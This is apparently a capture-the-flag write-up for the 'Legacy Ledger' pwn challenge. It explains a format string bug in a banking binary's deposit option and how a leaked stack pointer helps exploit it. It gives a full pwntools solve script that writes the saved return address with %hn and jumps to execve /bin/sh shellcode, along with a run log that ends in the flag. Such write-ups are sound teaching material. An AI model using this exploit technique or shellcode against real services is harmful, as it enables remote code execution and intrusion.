---
title: Legacy Ledger
date: 2026-06-26
tags:
- pwn
- TraceBash-CTF-2026
---

**Challenge:** Legacy Ledger
**Category:** Pwn
**Flag:** `TBCTF{b0rg3d-5t@ck}`

---

## My initial read / first impressions

We are given a remote service:

```bash
nc 13.127.119.28 1336
```

and a binary called `chall`.

The challenge description talks about old banking code, strange transaction handling, and memory-related surprises. So this already sounds like a classic pwn challenge where some normal-looking menu option has a memory bug.

Running the binary locally gives a small banking menu:

```text
Welcome to Bash Bank!
What would you like to do? (view balance|deposit|withdraw|transfer|exit)
```

The options are:

- `view balance`
- `deposit`
- `withdraw`
- `transfer`
- `exit`

At the very beginning, before the menu, the program also prints two pointers:

```text
0x7ffc967850c0, 0x7ffc967850ac
```

That is already very suspicious. In a pwn challenge, a random pointer leak at startup is basically the program saying, "please defeat ASLR."

## Binary protections

Checking the binary showed the important protections:

```text
PIE enabled
Canary enabled
NX disabled
Partial RELRO
```

The main thing here is that **NX is disabled**, meaning the stack is executable.

So if we can control the return address and put shellcode on the stack, we can just jump straight into our own shellcode. No need for a complicated ROP chain.

The canary is enabled, but that does not matter as much if we do not smash the stack directly. Instead, we can use a format string write to overwrite the saved return address without touching the canary.

## Looking through the program

The interesting part is the `deposit` option.

In the disassembly, the program does something like this:

```c
printf("Enter amount: ");
fgets(buffer, 0x400, stdin);
printf(buffer);
amount = atoi(buffer);
balance += amount;
```

The bug is this line:

```c
printf(buffer);
```

This is a format string vulnerability.

The program should have done:

```c
printf("%s", buffer);
```

but instead it passes our input directly as the format string.

So if we enter something like:

```text
%p %p %p %p
```

the program starts printing values from the stack. More importantly, format strings also allow writes using `%n`.

That means we can use the `deposit` amount field to write to memory.

## The leak

At the start of the program, the binary prints this:

```c
printf("%p, %p\n", buffer, &balance);
```

The first pointer is the stack buffer where our input is stored.

This is very useful because the binary is PIE and ASLR is on, but now we know exactly where our input buffer is on the stack.

From the disassembly, the stack layout looks like this:

```text
buffer    = rbp - 0x410
canary    = rbp - 0x8
saved rbp = rbp
saved rip = rbp + 0x8
```

So the saved return address is:

```text
saved rip = buffer + 0x418
```

That gives us the exact address we need to overwrite.

## Exploit idea

Since NX is disabled, the plan is pretty simple:

1. Use the leaked stack buffer address.
2. Put shellcode inside the buffer.
3. Use the format string bug in `deposit` to overwrite the saved return address.
4. Make the saved return address point to the shellcode.
5. Send `exit` so `main` returns.
6. The program jumps into our shellcode and gives us a shell.

The only annoying part is writing a full 64-bit address with a format string.

For that, I used `%hn`, which writes 2 bytes at a time.

So instead of writing the whole saved RIP at once, I write:

```text
saved_rip
saved_rip + 2
saved_rip + 4
```

That covers the lower 6 bytes of the address, which is enough for a normal userspace address on amd64.

## Finding where our buffer is in printf arguments

When `printf(buffer)` runs, it treats the stack as if there are extra arguments even though the program did not pass any.

Since our input buffer is also on the stack, parts of our buffer eventually appear as fake printf arguments.

The first qword of our buffer lines up with argument 12.

So if we place addresses later in the payload, we can calculate their argument index.

I placed the target addresses at offset `0x300` inside the buffer.

Since each argument is 8 bytes:

```text
0x300 / 8 = 96
```

and since the buffer starts at argument 12:

```text
first pointer argument = 12 + 96 = 108
```

That means the addresses I put at offset `0x300` can be accessed as:

```text
%108$hn
%109$hn
%110$hn
```

## Payload layout

The final payload looks like this:

```text
[format string writes]
[null byte]
[padding]
[shellcode]
[padding]
[address of saved_rip]
[address of saved_rip + 2]
[address of saved_rip + 4]
```

The null byte is there to stop `printf` from continuing into the shellcode and address area. `fgets` still stores the whole payload in memory, but `printf` stops printing once it hits the null byte.

So the shellcode and addresses are still in the stack buffer, but they do not mess up the format string parsing.

## Solve script

This was my final solve script:

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = "13.127.119.28"
PORT = 1336

BASE_ARG = 12
SHELL_OFF = 0x200
ADDR_OFF = 0x300

context.arch = "amd64"
context.log_level = "info"

SHELLCODE = (
    b"\x48\x31\xd2"
    b"\x48\x31\xc0"
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

def build_fmt_hn_writes(writes):
    out = b""
    printed = 0

    for _, value, idx in sorted(writes, key=lambda x: x[1]):
        value &= 0xffff
        pad = (value - printed) & 0xffff

        if pad:
            out += f"%1${pad}c".encode()
            printed = (printed + pad) & 0xffff

        out += f"%{idx}$hn".encode()

    return out

def make_payload(buf_leak):
    saved_rip = buf_leak + 0x418
    shell_addr = buf_leak + SHELL_OFF

    first_ptr_arg = BASE_ARG + (ADDR_OFF // 8)

    targets = [
        saved_rip,
        saved_rip + 2,
        saved_rip + 4,
    ]

    arg_indexes = [
        first_ptr_arg,
        first_ptr_arg + 1,
        first_ptr_arg + 2,
    ]

    halfwords = [
        shell_addr & 0xffff,
        (shell_addr >> 16) & 0xffff,
        (shell_addr >> 32) & 0xffff,
    ]

    fmt = build_fmt_hn_writes(list(zip(targets, halfwords, arg_indexes)))

    payload = fmt
    payload += b"\x00"
    payload = payload.ljust(SHELL_OFF, b"A")
    payload += SHELLCODE
    payload = payload.ljust(ADDR_OFF, b"B")
    payload += b"".join(p64(x) for x in targets)

    return payload

def start():
    if args.LOCAL:
        return process("./chall")
    return remote(HOST, PORT)

def main():
    io = start()

    banner = io.recvuntil(b"exit) ")
    m = re.search(rb"(0x[0-9a-fA-F]+),\s*(0x[0-9a-fA-F]+)", banner)

    buf = int(m.group(1), 16)

    log.success(f"stack buffer leak = {hex(buf)}")
    log.info(f"saved RIP          = {hex(buf + 0x418)}")
    log.info(f"shellcode addr     = {hex(buf + SHELL_OFF)}")

    io.sendline(b"deposit")
    io.recvuntil(b"Enter amount: ")
    io.sendline(make_payload(buf))

    io.recvuntil(b"exit) ")
    io.sendline(b"exit")

    io.sendline(b"cat /app/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null")
    io.interactive()

if __name__ == "__main__":
    main()
```

## Running it

Running the solve script against the remote server:

```bash
python solve.py
```

gave:

```text
[+] Opening connection to 13.127.119.28 on port 1336: Done
[+] stack buffer leak = 0x7ffc967850c0
[*] saved RIP          = 0x7ffc967854d8
[*] shellcode addr     = 0x7ffc967852c0
[*] Switching to interactive mode
TBCTF{b0rg3d-5t@ck}
```

## Flag

```text
TBCTF{b0rg3d-5t@ck}
```
